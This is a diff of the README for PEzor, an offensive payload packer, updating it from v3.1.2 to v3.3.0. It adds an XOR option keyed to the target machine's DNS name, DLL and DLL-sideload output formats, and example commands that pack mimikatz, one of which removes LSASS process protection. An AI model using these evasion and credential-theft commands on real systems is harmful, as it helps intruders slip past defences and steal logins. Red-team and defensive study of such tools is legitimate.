@@ -10,7 +10,7 @@ Read the blog posts here:
 
 ```raw
  ________________
-< PEzor!! v3.1.2 >
+< PEzor!! v3.3.0 >
  ----------------
       \                    / \  //\
        \    |\___/|      /   \//  \\
@@ -46,9 +46,9 @@ $ sudo bash install.sh
 $ bash PEzor.sh -h
 ```
 
-# Upgrading from v2.x.x
+# ~Upgrading from v2.x.x~
 
-The `PATH` variable has to be updated to use a specific commit of [Donut](https://github.com/TheWover/donut)! Check the updated `install.sh` script.
+~The `PATH` variable has to be updated to use a specific commit of [Donut](https://github.com/TheWover/donut)! Check the updated `install.sh` script.~
 
 <!-- installstop -->
 
@@ -93,6 +93,7 @@ OPTIONS
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
   -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
+  -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
 
 EXAMPLES
@@ -106,10 +107,18 @@ EXAMPLES
   $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
   # 64-bit (fluctuate to NOACCESS when sleeping)
   $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
+  # 64-bit (use environmental keying with GetComputerNameExA)
+  $ PEzor.sh -xorkey=MY-FQDN-COMPUTER-NAME -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
+  # 64-bit (support EXEs with resources by keeping PE headers in memory)
+  $ PEzor.sh -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -k 2 -p '"!+" "!processprotect" "/process:lsass.exe" "/remove" "!-" "exit"'
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (beacon object file w/ cleanup)
   $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (dll)
+  $ PEzor.sh -format=dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
+  # 64-bit (dll sideload)
+  $ PEzor.sh -format=dll -dll-sideload=version.dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (reflective dll)
   $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (service exe)
@@ -157,6 +166,7 @@ OPTIONS
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
   -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
+  -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)
 
 EXAMPLES
   # 64-bit (self-inject RWX)
@@ -171,10 +181,16 @@ EXAMPLES
   $ PEzor.sh -fluctuate=RW shellcode.bin
   # 64-bit (fluctuate to NOACCESS when sleeping)
   $ PEzor.sh -fluctuate=NA shellcode.bin
+  # 64-bit (use environmental keying with GetComputerNameExA)
+  $ PEzor.sh -xorkey=MY-FQDN-MACHINE-NAME shellcode.bin
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof shellcode.bin
   # 64-bit (beacon object file w/ cleanup)
   $ PEzor.sh -format=bof -cleanup shellcode.bin
+  # 64-bit (dll)
+  $ PEzor.sh -format=dll shellcode.bin
+  # 64-bit (dll sideload)
+  $ PEzor.sh -format=dll -dll-sideload=version.dll shellcode.bin
   # 64-bit (reflective dll)
   $ PEzor.sh -format=reflective-dll shellcode.bin
   # 64-bit (service exe)
